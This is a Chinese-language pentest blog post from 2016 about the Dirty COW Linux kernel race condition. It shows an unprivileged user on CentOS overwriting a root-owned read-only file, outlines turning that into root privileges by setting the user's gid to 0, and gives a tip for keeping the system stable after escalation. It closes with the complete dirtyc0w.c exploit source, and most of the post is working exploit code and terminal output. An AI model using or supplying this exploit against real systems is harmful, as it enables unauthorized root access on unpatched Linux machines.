---
draft: false
date: 2016-10-22 00:10:46
title: 脏牛漏洞
description: 
categories:
  - Pentest
tags:
  - intranet
---

### 0x00 测试环境
我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
```
CentOS release 6.5
[reber123@WYB ~]$ uname -a
Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[reber123@WYB ~]$ id
uid=502(reber123) gid=502(reber123) groups=502(reber123)
```

### 0x01 创建文件
查看文件权限信息，可以看到属主为root，且只读，权限为0404
```
[reber123@WYB ~]$ ls -al test
-r-----r-- 1 root root 19 Oct 21 00:02 test
[reber123@WYB ~]$ cat test
this is not a test
[reber123@WYB ~]$
```

### 0x02 编译、执行poc
POC保存为a.c，编译为aaa
```
[reber123@WYB ~]$ gcc -lpthread a.c -o aaa
[reber123@WYB ~]$ ls
aaa  a.c  test
[reber123@WYB ~]$

更改test的内容
[reber123@WYB ~]$ ./aaa test xxxxxxxxxxx
mmap f8969000

^C
[reber123@WYB ~]$ cat test
xxxxxxxxxxx a test
[reber123@WYB ~]$
```

### 0x03 后续利用
更改用户gid为0即可
![脏牛1](/img/post/dirty_cow1.png)
![脏牛2](/img/post/dirty_cow2.png)
```
提权后执行下：echo 0 > /proc/sys/vm/dirty_writeback_centisecs 
用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
```

### 0x04 附poc
```
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
  
void *map;
int f;
struct stat st;
char *name;
  
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
  
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
  
  
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```